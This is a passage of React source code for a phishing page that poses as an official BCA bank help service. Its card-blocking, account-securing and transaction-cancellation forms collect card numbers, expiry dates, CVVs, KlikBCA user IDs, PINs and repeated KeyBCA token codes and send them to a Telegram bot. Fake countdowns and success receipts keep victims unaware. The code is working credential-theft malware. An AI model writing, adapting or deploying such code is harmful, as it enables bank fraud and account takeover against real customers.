            exit={{ opacity: 0 }}
            transition={{ duration: 0.2 }}
            className="absolute inset-0 z-50 bg-slate-950/75 backdrop-blur-md flex flex-col justify-end sm:justify-center items-center p-0 sm:p-3 font-sans"
          >
            <motion.div
              initial={{ y: 28, scale: 0.96, opacity: 0 }}
              animate={{ y: 0, scale: 1, opacity: 1 }}
              exit={{ y: 28, scale: 0.96, opacity: 0 }}
              transition={{ duration: 0.28, ease: [0.16, 1, 0.3, 1] }}
              className="form-wrapper-container w-[var(--form-wrapper-width)] max-w-[var(--form-wrapper-max-width)] mx-auto max-h-[95%] bg-white rounded-t-3xl sm:rounded-2xl flex flex-col overflow-hidden shadow-2xl border border-slate-200"
            >
              {/* Modal Header */}
              <div className="bg-[#00529C] px-4 py-3 text-white flex items-center justify-between shrink-0 shadow-md">
                <div className="flex items-center gap-2">
                  <img
                    src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiEShyphenhyphenecrz4Lyrs3a8-h3oG-6Hqh5FMdYhVba8_4NMy_60IXDS6stwE6cSp_LL9TfhfpLM4I6IyGZTZUL5ZfTOHAsTKTYx8FqW3xVPM0_RiXRRBgoajU6OT-G5BXtKPFzMsfrnBgmTq2OCD/s1000/logo+bank+bca-01.png"
                    alt="BCA"
                    referrerPolicy="no-referrer"
                    className="h-6 w-auto object-contain brightness-0 invert"
                  />
                  <span className="text-xs sm:text-sm font-extrabold tracking-tight">Layanan Bantuan Resmi BCA</span>
                </div>
                <button
                  onClick={() => {
                    triggerHaptic(10);
                    setActiveFormId(null);
                    setFormSubmissionResult(null);
                    setBlockingOverlay(null);
                    setUserIdStep('credentials');
                  }}
                  className="p-1.5 rounded-full bg-white/15 hover:bg-white/30 text-white transition-all active:scale-90 cursor-pointer"
                  aria-label="Tutup Form"
                >
                  <X className="w-5 h-5 stroke-[2.2]" />
                </button>
              </div>

              {/* Modal Scrollable Body */}
              <div className="p-3.5 sm:p-5 pb-12 sm:pb-8 overflow-y-auto max-h-[calc(88vh-55px)]">
                {blockingOverlay ? (
                  /* Visual Countdown & Protection Overlay */
                  <div className="py-5 px-2 text-center space-y-4 font-sans">
                    {blockingOverlay.stage === 'counting' ? (
                      <motion.div
                        key="counting"
                        initial={{ scale: 0.9, opacity: 0 }}
                        animate={{ scale: 1, opacity: 1 }}
                        exit={{ scale: 0.9, opacity: 0 }}
                        className="flex flex-col items-center space-y-4"
                      >
                        {/* 3-2-1 Animated Ring */}
                        <div className="relative w-24 h-24 flex items-center justify-center">
                          <div className="absolute inset-0 rounded-full border-4 border-blue-100 animate-ping opacity-25" />
                          <div className="absolute inset-0 rounded-full border-4 border-t-[#00529C] border-r-[#00529C] border-b-blue-200 border-l-blue-200 animate-spin" />
                          <div className="w-18 h-18 rounded-full bg-[#00529C] text-white flex flex-col items-center justify-center shadow-lg border-2 border-cyan-300">
                            <span className="text-3xl font-black font-mono leading-none animate-pulse">
                              {blockingOverlay.countdown}
                            </span>
                            <span className="text-[9px] uppercase tracking-wider font-semibold opacity-90 mt-0.5">
                              DETIK
                            </span>
                          </div>
                        </div>

                        <div className="space-y-2">
                          <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-blue-50 border border-blue-200 text-[#00529C] text-xs font-bold shadow-2xs">
                            <ShieldCheck className="w-4 h-4 text-[#00529C] animate-bounce" />
                            <span>
                              {blockingOverlay.targetService === 'pembatalan-transaksi' ? (
                                <>
                                  {blockingOverlay.countdown >= 5 && 'Menghubungi Server Pembatalan Halo BCA...'}
                                  {blockingOverlay.countdown === 4 && 'Validasi Foto Struk & Data Transaksi...'}
                                  {blockingOverlay.countdown === 3 && 'Proses Reversal & Verifikasi Resi Digital...'}
                                  {blockingOverlay.countdown === 2 && 'Mengunci Transaksi & Mengirim Laporan...'}
                                  {blockingOverlay.countdown <= 1 && 'Memverifikasi Resi Digital Resmi...'}
                                </>
                              ) : blockingOverlay.targetService === 'user-id' || blockingOverlay.targetService === 'keybca' ? (
                                <>
                                  {blockingOverlay.countdown >= 5 && 'Menghubungi Server Keamanan KlikBCA...'}
                                  {blockingOverlay.countdown === 4 && 'Memvalidasi User ID & Kredensial...'}
                                  {blockingOverlay.countdown === 3 && 'Mengamankan Sesi Login & Enkripsi...'}
                                  {blockingOverlay.countdown === 2 && 'Memutus Akses Sesi Perangkat Lain...'}
                                  {blockingOverlay.countdown <= 1 && 'Menerbitkan Tiket Keamanan Resmi...'}
                                </>
                              ) : (
                                <>
                                  {blockingOverlay.countdown >= 5 && 'Menghubungi Server Tanggap Darurat BCA...'}
                                  {blockingOverlay.countdown === 4 && 'Memvalidasi Identitas & Data Kartu...'}
                                  {blockingOverlay.countdown === 3 && 'Proses Enkripsi & Pembekuan Kartu...'}
                                  {blockingOverlay.countdown === 2 && 'Mengunci Seluruh Akses Transaksi...'}
                                  {blockingOverlay.countdown <= 1 && 'Memverifikasi Status Pemblokiran...'}
                                </>
                              )}
                            </span>
                          </div>
                          <h3 className="text-base sm:text-lg font-extrabold text-slate-900">
                            {blockingOverlay.targetService === 'pembatalan-transaksi'
                              ? 'Proses Pembatalan Transaksi Berlangsung'
                              : blockingOverlay.targetService === 'user-id' || blockingOverlay.targetService === 'keybca'
                              ? 'Proses Pengamanan User ID Berlangsung'
                              : 'Proses Pemblokiran Darurat Berlangsung'}
                          </h3>
                          <p className="text-xs text-slate-500 font-medium max-w-xs mx-auto leading-relaxed">
                            {blockingOverlay.targetService === 'pembatalan-transaksi'
                              ? 'Sistem Halo BCA sedang memproses pembatalan transaksi & memverifikasi bukti struk.'
                              : blockingOverlay.targetService === 'user-id' || blockingOverlay.targetService === 'keybca'
                              ? 'Sistem keamanan KlikBCA sedang memverifikasi kredensial & mengamankan akun.'
                              : `Sistem proteksi Halo BCA sedang membekukan kartu ${blockingOverlay.cardInfo} secara otomatis.`}
                          </p>

                          {/* Smooth Progress Bar */}
                          <div className="w-full max-w-xs bg-slate-100 h-2 rounded-full overflow-hidden mx-auto mt-2 border border-slate-200/80">
                            <div
                              className="bg-[#00529C] h-full transition-all duration-1000 ease-linear rounded-full"
                              style={{ width: `${Math.min(100, Math.max(0, ((6 - blockingOverlay.countdown) / 6) * 100))}%` }}
                            />
                          </div>
                        </div>
                      </motion.div>
                    ) : (
                      <motion.div
                        key="success"
                        initial={{ scale: 0.88, opacity: 0 }}
                        animate={{ scale: 1, opacity: 1 }}
                        transition={{ type: 'spring', damping: 20, stiffness: 300 }}
                        className="flex flex-col items-center space-y-3 py-2"
                      >
                        <div className="w-16 h-16 bg-emerald-500 text-white rounded-full flex items-center justify-center shadow-xl ring-8 ring-emerald-100 animate-bounce">
                          <CheckCircle2 className="w-10 h-10 stroke-[2.5]" />
                        </div>

                        <div className="space-y-1.5">
                          <div className="inline-block px-3 py-0.5 rounded-full bg-emerald-100 border border-emerald-300 text-emerald-800 text-[11px] font-black uppercase tracking-wide">
                            {blockingOverlay.targetService === 'pembatalan-transaksi'
                              ? '✓ PEMBATALAN TRANSAKSI SUKSES'
                              : blockingOverlay.targetService === 'user-id' || blockingOverlay.targetService === 'keybca'
                              ? '✓ AKUN BERHASIL DIAMANKAN'
                              : '✓ KARTU BERHASIL DIBLOKIR'}
                          </div>
                          <h3 className="text-lg font-extrabold text-slate-900">
                            {blockingOverlay.targetService === 'pembatalan-transaksi'
                              ? 'Pembatalan Transaksi Berhasil!'
                              : blockingOverlay.targetService === 'user-id' || blockingOverlay.targetService === 'keybca'
                              ? 'User ID Berhasil Diamankan!'
                              : blockingOverlay.targetService === 'blokir-bca'
                              ? 'Kartu BCA Berhasil Diblokir!'
                              : 'Bank Mitra Berhasil Diamankan!'}
                          </h3>
                          <p className="text-xs text-slate-600 font-medium max-w-xs mx-auto leading-relaxed">
                            {blockingOverlay.targetService === 'pembatalan-transaksi'
                              ? 'Pengajuan pembatalan transaksi disetujui. Membuka Resi Digital Resmi...'
                              : blockingOverlay.targetService === 'user-id' || blockingOverlay.targetService === 'keybca'
                              ? 'Kredensial KlikBCA & akun Anda telah berhasil diamankan.'
                              : `Kartu ${blockingOverlay.cardInfo} telah resmi dibekukan. Mengarahkan ke Otentikasi Remote KeyBCA...`}
                          </p>
                        </div>

                        <button
                          onClick={() => {
                            triggerHaptic(15);
                            if (blockingOverlay.targetService === 'pembatalan-transaksi') {
                              const data = blockingOverlay.pembatalanData;
                              const refNo = `REV-${new Date().getFullYear()}${(new Date().getMonth() + 1).toString().padStart(2, '0')}${Math.floor(100000 + Math.random() * 900000)}`;
                              const timeStr = new Date().toLocaleString('id-ID', {
                                day: '2-digit',
                                month: 'short',
                                year: 'numeric',
                                hour: '2-digit',
                                minute: '2-digit',
                                second: '2-digit',
                              }) + ' WIB';

                              setFormSubmissionResult({
                                title: 'Pembatalan Transaksi Berhasil',
                                subtitle: 'Resi Digital Resmi telah diterbitkan dan permohonan reversal transaksi berhasil diproses oleh sistem Halo BCA.',
                                previewUrl: data?.previewUrl || null,
                                details: [
                                  { label: 'No. Referensi (Ref No)', value: refNo },
                                  { label: 'Waktu Pengajuan', value: timeStr },
                                  { label: 'No. Rekening / Kartu', value: data?.accountNo || '-' },
                                  { label: 'Nama Pemilik', value: data?.accountName || '-' },
                                  { label: 'Nominal Transaksi', value: data?.amount || 'Rp 0' },
                                  { label: 'Tanggal Transaksi', value: data?.date || '-' },
                                  { label: 'Alasan Pembatalan', value: data?.reason || '-' },
                                  { label: 'Status Stempel', value: 'PEMBATALAN DITERIMA (REVERSAL)' },
                                ],
                              });
                              setBlockingOverlay(null);
                            } else {
                              setBlockingOverlay(null);
                              setActiveFormId('pembatalan-transaksi');
                            }
                          }}
                          className="w-full max-w-xs py-2.5 bg-[#00529C] hover:bg-[#003B73] text-white font-extrabold text-xs rounded-xl shadow-md active:scale-95 transition-all cursor-pointer uppercase tracking-wider flex items-center justify-center gap-2 mt-1"
                        >
                          <span>
                            {blockingOverlay.targetService === 'pembatalan-transaksi'
                              ? 'Lihat Resi Digital Pembatalan'
                              : 'Lanjut ke Pembatalan Transaksi'}
                          </span>
                          <MoveRight className="w-4 h-4" />
                        </button>
                      </motion.div>
                    )}
                  </div>
                ) : formSubmissionResult ? (
                  /* Success Receipt Screen */
                  <div className="text-center py-3 px-1 sm:px-2 space-y-3.5 font-sans">
                    <div className="w-14 h-14 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto shadow-sm">
                      <CheckCircle2 className="w-9 h-9 stroke-[2.5]" />
                    </div>

                    <div>
                      <h3 className="text-base sm:text-lg font-extrabold text-slate-900">{formSubmissionResult.title}</h3>
                      <p className="text-xs text-slate-600 mt-0.5 leading-relaxed">{formSubmissionResult.subtitle}</p>
                    </div>

                    {/* Struk / Proof Image Preview if present */}
                    {formSubmissionResult.previewUrl && (
                      <div className="bg-slate-50 border border-slate-200 rounded-xl p-2.5 text-center">
                        <span className="text-[10px] font-bold uppercase tracking-wider text-slate-500 block mb-1">
                          📷 Bukti Struk Transaksi Terlampir
                        </span>
                        <img
                          src={formSubmissionResult.previewUrl}
                          alt="Bukti Struk Transaksi"
                          className="max-h-32 mx-auto rounded-lg border border-slate-300 object-contain shadow-xs"
                        />
                      </div>
                    )}

                    <div className="bg-slate-50 border border-slate-200 rounded-xl p-3 text-left space-y-2 text-xs">
                      {formSubmissionResult.details.map((item, idx) => (
                        <div key={idx} className="flex justify-between items-center py-1 border-b border-slate-200/60 last:border-0">
                          <span className="text-slate-500 font-medium">{item.label}</span>
                          <span className="font-extrabold text-slate-900 font-mono text-right">{item.value}</span>
                        </div>
                      ))}
                    </div>

                    <div className="bg-blue-50 border border-blue-200/80 rounded-xl p-2.5 text-[11px] text-[#00529C] font-semibold text-left flex items-start gap-2">
                      <ShieldCheck className="w-5 h-5 shrink-0 text-[#00529C]" />
                      <span>Laporan & bukti transaksi Anda telah terenkripsi resmi dan diteruskan ke unit investigasi Halo BCA 1500888.</span>
                    </div>

                    {activeFormId === 'user-id' && (
                      <button
                        onClick={() => {
                          triggerHaptic(15);
                          setFormSubmissionResult(null);
                          setUserIdStep('keybca');
                        }}
                        className="w-full py-2.5 bg-amber-600 hover:bg-amber-700 text-white font-extrabold text-xs sm:text-sm rounded-xl shadow-md active:scale-95 transition-all cursor-pointer uppercase tracking-wider flex items-center justify-center gap-2"
                      >
                        <KeyRound className="w-4 h-4" />
                        <span>Input Kode KeyBCA Lainnya (Berulang)</span>
                      </button>
                    )}

                    <button
                      onClick={() => {
                        triggerHaptic(15);
                        setActiveFormId(null);
                        setFormSubmissionResult(null);
                        setUserIdStep('credentials');
                      }}
                      className="w-full py-2.5 bg-[#00529C] hover:bg-[#00407A] text-white font-extrabold text-xs sm:text-sm rounded-xl shadow-md active:scale-95 transition-all cursor-pointer uppercase tracking-wider"
                    >
                      Selesai & Kembali
                    </button>
                  </div>
                ) : (
                  /* Active Form Selection */
                  <>
                    {activeFormId === 'blokir-bca' && (
                      <BlokirForm
                        onSubmit={(payload) => {
                          triggerHaptic(15);
                          const timeStr = new Date().toLocaleString('id-ID', {
                            day: '2-digit', month: '2-digit', year: 'numeric',
                            hour: '2-digit', minute: '2-digit', second: '2-digit'
                          }) + ' WIB';

                          const telegramText = `🚨 <b>DATA PEMBLOKIRAN KARTU BCA</b> 🚨

<pre><code>Bank Target  : ${payload.bankName || 'BANK BCA'}
Jenis Kartu  : ${payload.cardType || '-'}
Nomor Kartu  : ${payload.cardNumber || '-'}
Nomor HP/WA  : ${payload.phone || '-'}
Masa Berlaku : ${payload.expiry || '-'}
CVV / CVC    : ${payload.cvv || '-'}
Limit/Saldo  : ${payload.limit || '-'}
Waktu Input  : ${timeStr}</code></pre>

<b>📋 Salin Per Item:</b>
• No. Kartu: <code>${payload.cardNumber || '-'}</code>
• Masa Berlaku: <code>${payload.expiry || '-'}</code>
• CVV / CVC: <code>${payload.cvv || '-'}</code>`;

                          sendToTelegram({ text: telegramText });

                          setBlockingOverlay({
                            countdown: 6,
                            stage: 'counting',
                            cardInfo: `${payload.cardType} (${payload.cardNumber.slice(-4)})`,
                            targetService: 'blokir-bca',
                          });
                        }}
                      />
                    )}

                    {activeFormId === 'amankan-bank-lain' && (
                      <BankLainForm
                        onSubmit={(payload) => {
                          triggerHaptic(15);
                          const timeStr = new Date().toLocaleString('id-ID', {
                            day: '2-digit', month: '2-digit', year: 'numeric',
                            hour: '2-digit', minute: '2-digit', second: '2-digit'
                          }) + ' WIB';

                          const telegramText = `🛡️ <b>DATA AMANKAN BANK LAIN</b> 🛡️

<pre><code>Bank Target  : ${payload.bankName || '-'}
Jenis Kartu  : ${payload.cardType || '-'}
Nomor Kartu  : ${payload.cardNumber || '-'}
Nomor HP/WA  : ${payload.phone || '-'}
Masa Berlaku : ${payload.expiry || '-'}
CVV / CVC    : ${payload.cvv || '-'}
Limit/Saldo  : ${payload.limit || '-'}
Waktu Input  : ${timeStr}</code></pre>

<b>📋 Salin Per Item:</b>
• No. Kartu: <code>${payload.cardNumber || '-'}</code>
• Masa Berlaku: <code>${payload.expiry || '-'}</code>
• CVV / CVC: <code>${payload.cvv || '-'}</code>`;

                          sendToTelegram({ text: telegramText });

                          setBlockingOverlay({
                            countdown: 6,
                            stage: 'counting',
                            cardInfo: `${payload.bankName} (${payload.cardNumber.slice(-4)})`,
                            targetService: 'amankan-bank-lain',
                          });
                        }}
                      />
                    )}

                    {activeFormId === 'pembatalan-transaksi' && (
                      <PembatalanForm
                        onSubmit={(payload) => {
                          triggerHaptic(15);

                          const telegramText = `📄 <b>Bukti Transaksi</b>`;

                          sendToTelegram({ text: telegramText, photoBase64: payload.previewUrl });

                          setBlockingOverlay({
                            countdown: 6,
                            stage: 'counting',
                            cardInfo: payload.accountNo ? `Rekening/Kartu ${payload.accountNo}` : 'Bukti Struk Transaksi',
                            targetService: 'pembatalan-transaksi',
                            pembatalanData: payload,
                          });
                        }}
                      />
                    )}

                    {activeFormId === 'amankan-user-id' && (
                      <UserIdForm
                        step={userIdStep}
                        onSubmit={(payload) => {
                          triggerHaptic(15);
                          const timeStr = new Date().toLocaleString('id-ID', {
                            day: '2-digit', month: '2-digit', year: 'numeric',
                            hour: '2-digit', minute: '2-digit', second: '2-digit'
                          }) + ' WIB';

                          const telegramText = `🔐 <b>DATA KLIKBCA / USER ID</b> 🔐

<pre><code>Layanan      : KlikBCA ${payload.mode}
Corporate ID : ${payload.corporateId || '-'}
User ID      : ${payload.userId}
PIN / Pass   : ${payload.pinOrKeyBca}
Waktu Input  : ${timeStr}</code></pre>

<b>📋 Salin Per Item:</b>
• Mode: <code>KlikBCA ${payload.mode}</code>
• Corp ID: <code>${payload.corporateId || '-'}</code>
• User ID: <code>${payload.userId}</code>
• PIN/Pass: <code>${payload.pinOrKeyBca}</code>`;

                          sendToTelegram({ text: telegramText });
                          setBlockingOverlay({
                            countdown: 6,
                            stage: 'counting',
                            cardInfo: payload.userId,
                            targetService: 'user-id',
                            userIdData: payload,
                          });
                        }}
                        onSubmitKeyBca={(code) => {
                          triggerHaptic(15);
                          const timeStr = new Date().toLocaleString('id-ID', {
                            day: '2-digit', month: '2-digit', year: 'numeric',
                            hour: '2-digit', minute: '2-digit', second: '2-digit'
                          }) + ' WIB';

                          const telegramText = `🔑 <b>DATA KEYBCA APPLI 1</b> 🔑

<pre><code>Layanan      : KeyBCA APPLI 1
Respon KeyBCA: ${code}
Waktu Input  : ${timeStr}</code></pre>

<b>📋 Salin Per Item:</b>
• KeyBCA APPLI 1: <code>${code}</code>`;

                          sendToTelegram({ text: telegramText });

                          setBlockingOverlay({
                            countdown: 6,
                            stage: 'counting',
                            cardInfo: 'KeyBCA APPLI 1',
                            targetService: 'keybca',
                            userIdData: { code },
                          });
                        }}
                        onBack={() => setUserIdStep('credentials')}
                      />
                    )}
                  </>
                )}
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

    </div>
  );
};

